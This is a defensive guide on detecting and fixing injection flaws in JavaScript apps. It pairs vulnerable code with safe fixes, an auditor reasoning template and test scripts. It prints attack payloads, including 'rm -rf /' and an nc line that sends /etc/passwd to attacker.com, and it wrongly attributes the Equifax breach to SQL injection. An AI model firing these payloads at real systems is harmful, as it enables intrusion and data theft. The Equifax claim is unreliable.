# Injection Attack Detection Methodology

## Overview

Injection vulnerabilities occur when untrusted data is sent to an interpreter as part of a command or query, allowing attackers to execute unintended commands or access unauthorized data.

## SQL Injection

### Detection Patterns

**Vulnerable Code:**
```javascript
// Direct string concatenation
app.post('/login', (req, res) => {
    const query = `SELECT * FROM users WHERE username = '${req.body.username}' AND password = '${req.body.password}'`;
    db.query(query, (err, results) => {
        // ...
    });
});
```

**Attack Payload:**
```
username: admin' OR '1'='1
password: anything
Final query: SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'
```

**Detection Checklist:**
- ✗ String concatenation with user input
- ✗ Template literals with ${userInput}
- ✗ No parameterized queries
- ✗ No input validation

**Safe Implementation:**
```javascript
// Parameterized query
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.query(query, [req.body.username, req.body.password], (err, results) => {
    // Safe
});
```

## NoSQL Injection

### MongoDB Injection

**Vulnerable Code:**
```javascript
// Object injection
app.post('/login', (req, res) => {
    db.collection('users').findOne({
        username: req.body.username,
        password: req.body.password
    });
});
```

**Attack Payload:**
```json
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
```
This bypasses authentication by matching any user with non-null username and password.

**Detection Checklist:**
- ✗ Direct object passed from req.body
- ✗ No sanitization of MongoDB operators ($ne, $gt, $where, etc.)
- ✗ Accepts objects in query parameters

**Safe Implementation:**
```javascript
const mongoSanitize = require('mongo-sanitize');

app.post('/login', (req, res) => {
    const username = mongoSanitize(req.body.username);
    const password = mongoSanitize(req.body.password);

    db.collection('users').findOne({
        username: username,
        password: password
    });
});
```

### NoSQL Operators to Check
- `$ne` - Not equal
- `$gt` / `$gte` - Greater than
- `$lt` / `$lte` - Less than
- `$where` - Arbitrary JavaScript execution
- `$regex` - Regular expression
- `$in` / `$nin` - In/not in array

## Command Injection

**Vulnerable Code:**
```javascript
// Shell command with user input
app.get('/ping', (req, res) => {
    const host = req.query.host;
    exec(`ping -c 4 ${host}`, (error, stdout) => {
        res.send(stdout);
    });
});
```

**Attack Payload:**
```
host: 8.8.8.8; cat /etc/passwd
host: 8.8.8.8 && rm -rf /
host: 8.8.8.8 | nc attacker.com 4444 < /etc/passwd
```

**Detection Checklist:**
- ✗ exec(), execSync(), spawn() with shell:true
- ✗ User input in command string
- ✗ No input validation/sanitization
- ✗ No command whitelist

**Safe Implementation:**
```javascript
const { execFile } = require('child_process');

app.get('/ping', (req, res) => {
    const host = req.query.host;

    // Validate input
    if (!/^[a-zA-Z0-9.-]+$/.test(host)) {
        return res.status(400).send('Invalid host');
    }

    // Use execFile with arguments array
    execFile('ping', ['-c', '4', host], (error, stdout) => {
        res.send(stdout);
    });
});
```

## ORM Injection

**Vulnerable Code (Sequelize):**
```javascript
// Raw query with string concatenation
app.get('/users', (req, res) => {
    const order = req.query.sort;
    User.findAll({
        order: [[order, 'ASC']] // Direct user input
    });
});
```

**Attack Payload:**
```
sort: (SELECT CASE WHEN (1=1) THEN 'id' ELSE 'name' END)
```

## LDAP Injection

**Vulnerable Code:**
```javascript
const ldap = require('ldapjs');

app.post('/login', (req, res) => {
    const username = req.body.username;
    const filter = `(&(uid=${username})(objectClass=person))`;

    client.search('dc=example,dc=com', { filter }, (err, res) => {
        // ...
    });
});
```

**Attack Payload:**
```
username: *)(uid=*))(|(uid=*
Final filter: (&(uid=*)(uid=*))(|(uid=*)(objectClass=person))
```

## Detection Algorithm

### Step 1: Identify Injection Points
- Database queries (SQL, NoSQL)
- Shell commands (exec, spawn)
- LDAP queries
- XPath queries
- XML parsers
- Template engines

### Step 2: Trace User Input
- req.body
- req.query
- req.params
- req.headers
- File uploads
- WebSocket messages

### Step 3: Check Sanitization
- Is input validated?
- Is input sanitized?
- Are parameterized queries used?
- Is there a whitelist?

### Step 4: Test Attack Vectors
- SQL payloads: `' OR '1'='1`, `' UNION SELECT`
- NoSQL payloads: `{"$ne": null}`
- Command payloads: `; cat /etc/passwd`
- LDAP payloads: `*)(uid=*`

## Chain-of-Thought Template

```json
{
  "step": "Analyzing login endpoint",
  "observation": "Line 45: Direct MongoDB query with req.body.username and req.body.password without sanitization",
  "hypothesis": "NoSQL injection possible via $ne operator",
  "validation": [
    "No mongo-sanitize usage",
    "No input type validation",
    "Objects accepted from req.body",
    "MongoDB operators not filtered"
  ],
  "conclusion": "CRITICAL: NoSQL injection allows authentication bypass",
  "confidence": 0.92,
  "exploit": "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}"
}
```

## Test Generation

### K6 Test
```javascript
import http from 'k6/http';
import { check } from 'k6';

export default function() {
    // Test NoSQL injection
    const payload = JSON.stringify({
        username: {"$ne": null},
        password: {"$ne": null}
    });

    const res = http.post('http://api.example.com/login', payload, {
        headers: { 'Content-Type': 'application/json' }
    });

    check(res, {
        'should reject injection': (r) => r.status === 400,
        'should not return auth token': (r) => !r.json('token')
    });

    // If status is 200, injection succeeded (vulnerability)
    if (res.status === 200) {
        console.error('CRITICAL: NoSQL injection successful');
    }
}
```

### curl Command
```bash
# SQL Injection test
curl -X POST http://api.example.com/login \
  -H 'Content-Type: application/json' \
  -d '{"username": "admin'\'' OR '\''1'\''='\''1", "password": "anything"}'

# NoSQL Injection test
curl -X POST http://api.example.com/login \
  -H 'Content-Type: application/json' \
  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'

# Command Injection test
curl 'http://api.example.com/ping?host=8.8.8.8;cat%20/etc/passwd'
```

## Remediation

### SQL Injection
```javascript
// ✓ Parameterized queries
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.query(query, [username, password]);

// ✓ ORM with proper escaping
User.findOne({ where: { username, password } });
```

### NoSQL Injection
```javascript
// ✓ Sanitize input
const mongoSanitize = require('mongo-sanitize');
const username = mongoSanitize(req.body.username);

// ✓ Validate input types
if (typeof req.body.username !== 'string') {
    return res.status(400).send('Invalid input');
}
```

### Command Injection
```javascript
// ✓ Use execFile instead of exec
const { execFile } = require('child_process');
execFile('ping', ['-c', '4', host]);

// ✓ Whitelist validation
const allowedHosts = ['8.8.8.8', '1.1.1.1'];
if (!allowedHosts.includes(host)) {
    return res.status(400).send('Invalid host');
}
```

## Historical Examples

- **Equifax Breach (2017)**: SQL injection, 147M records stolen
- **Heartland Payment Systems (2008)**: SQL injection, 130M cards compromised
- **TalkTalk (2015)**: SQL injection, £77M loss

## References

- OWASP: SQL Injection
- OWASP: NoSQL Injection
- CWE-89: SQL Injection
- CWE-77: Command Injection
- CWE-943: NoSQL Injection
